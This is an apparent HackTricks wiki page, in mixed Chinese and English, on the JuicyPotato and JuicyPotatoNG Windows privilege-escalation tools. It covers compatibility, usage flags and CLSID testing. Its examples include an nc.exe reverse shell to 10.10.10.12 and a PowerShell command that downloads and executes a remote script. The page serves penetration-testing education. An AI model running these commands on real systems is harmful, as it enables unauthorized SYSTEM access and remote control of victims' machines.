# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato 是遗留工具。它通常在 Windows 10 1803 / Windows Server 2016 及更早版本上有效。Microsoft 在 Windows 10 1809 / Server 2019 开始引入的强化更改破坏了原始技术。对于那些版本及更新的系统，请考虑使用更现代的替代方案，例如 PrintSpoofer、RoguePotato、SharpEfsPotato/EfsPotato、GodPotato 等。请参见下方页面以获取最新的选项和用法。


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (abusing the golden privileges) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_A sugared version of_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, with a bit of juice, i.e. **another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM**_

#### You can download juicypotato from [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### 兼容性快速说明

- 在当前上下文拥有 SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege 时，对 Windows 10 1803 和 Windows Server 2016 及更早版本可靠。
- 在 Windows 10 1809 / Windows Server 2019 及以后版本被 Microsoft 的加固破坏。对于这些版本，优先使用上面链接的替代工具。

### 摘要 <a href="#summary" id="summary"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) and its [variants](https://github.com/decoder-it/lonelypotato) leverages the privilege escalation chain based on [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) having the MiTM listener on `127.0.0.1:6666` and when you have `SeImpersonate` or `SeAssignPrimaryToken` privileges. During a Windows build review we found a setup where `BITS` was intentionally disabled and port `6666` was taken.

We decided to weaponize [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Say hello to Juicy Potato**.

> For the theory, see [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) and follow the chain of links and references.

我们发现，除了 `BITS` 之外，还有若干可以滥用的 COM 服务器。它们只需满足：

1. 可由当前用户实例化，通常是具有模拟权限的“服务用户”
2. 实现 `IMarshal` 接口
3. 以提升的用户身份运行（SYSTEM、Administrator 等）

经过一些测试，我们在多个 Windows 版本上收集并测试了大量[有趣的 CLSID](http://ohpe.it/juicy-potato/CLSID/)。

### 详细说明 <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato 允许你：

- **Target CLSID** _选择任意你想要的 CLSID。_[_Here_](http://ohpe.it/juicy-potato/CLSID/) _你可以找到按操作系统组织的列表。_
- **COM Listening port** _定义你偏好的 COM 监听端口（而不是封装时硬编码的 6666）_
- **COM Listening IP address** _在任意 IP 上绑定服务器_
- **Process creation mode** _根据被模拟用户的权限，你可以选择：_
- `CreateProcessWithToken` (needs `SeImpersonate`)
- `CreateProcessAsUser` (needs `SeAssignPrimaryToken`)
- `both`
- **Process to launch** _如果利用成功，启动可执行文件或脚本_
- **Process Argument** _自定义启动进程的参数_
- **RPC Server address** _为了更隐蔽的方法，你可以向外部 RPC 服务器进行认证_
- **RPC Server port** _如果你想认证到外部服务器且防火墙拦截了端口 `135`，此项有用…_
- **TEST mode** _主要用于测试目的，例如测试 CLSID。它会创建 DCOM 并打印 token 的用户。见_ [_here for testing_](http://ohpe.it/juicy-potato/Test/)

### Usage <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Final thoughts <a href="#final-thoughts" id="final-thoughts"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

如果用户拥有 `SeImpersonate` 或 `SeAssignPrimaryToken` 特权，那么你就是 **SYSTEM**。

几乎不可能完全阻止对这些 COM Servers 的滥用。你可以考虑通过 `DCOMCNFG` 修改这些对象的权限，但祝你好运，这将非常具有挑战性。

实际的解决方案是保护在 `* SERVICE` 帐户下运行的敏感帐户和应用程序。停止 `DCOM` 确实会抑制此类利用，但可能对底层操作系统造成严重影响。

From: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## JuicyPotatoNG (2022+)

JuicyPotatoNG 通过组合以下方法，在现代 Windows 上重新引入了 JuicyPotato-style 的本地提权：

- DCOM OXID resolution 到选定端口上的本地 RPC server，避免以前硬编码的 127.0.0.1:6666 监听器。
- 使用 SSPI hook 捕获并模拟入站的 SYSTEM 认证，而无需 RpcImpersonateClient，这也使得在仅存在 SeAssignPrimaryTokenPrivilege 时能够使用 CreateProcessAsUser。
- 满足 DCOM 激活约束的技巧（例如，针对 PrintNotify / ActiveX Installer Service classes 时之前的 INTERACTIVE-group 要求）。

重要说明（随各版本行为演变）：
- 2022 年 9 月：初始技术使用 “INTERACTIVE trick” 在受支持的 Windows 10/11 和 Server 目标上有效。
- 2023 年 1 月作者更新：Microsoft 随后阻止了 INTERACTIVE trick。不同的 CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) 恢复了利用，但根据他们的帖子仅在 Windows 11 / Server 2022 上有效。

Basic usage (more flags in the help):
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
如果你的目标是已对经典 JuicyPotato 修补的 Windows 10 1809 / Server 2019，优先使用顶部链接的替代方案（RoguePotato、PrintSpoofer、EfsPotato/GodPotato 等）。NG 的效果可能视具体的构建版本和服务状态而定。

## 示例

注意：访问 [this page](https://ohpe.it/juicy-potato/CLSID/) 获取可尝试的 CLSID 列表。

### 获取 nc.exe reverse shell
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell 反向
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### 启动一个新的 CMD（如果你有 RDP 访问）

![](<../../images/image (300).png>)

## CLSID 问题

通常 JuicyPotato 使用的默认 CLSID **不起作用**，exploit 会失败。通常需要多次尝试才能找到一个**有效的 CLSID**。要获取针对特定操作系统的 CLSID 列表，请访问此页面：

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **检查 CLSID**

首先，除了 juicypotato.exe，你还需要一些可执行文件。

下载 Join-Object.ps1 并将其加载到你的 PS 会话中，然后下载并执行 GetCLSID.ps1。该脚本会生成一个可供测试的 CLSID 列表。

然后下载 [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)(修改到 CLSID 列表和到 juicypotato 可执行文件 的路径) 并执行它。它会开始尝试每个 CLSID，**当端口号改变时，表示该 CLSID 生效**。

**使用参数 -c 检查有效的 CLSID**

## References

- [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [Giving JuicyPotato a second chance: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)

{{#include ../../banners/hacktricks-training.md}}
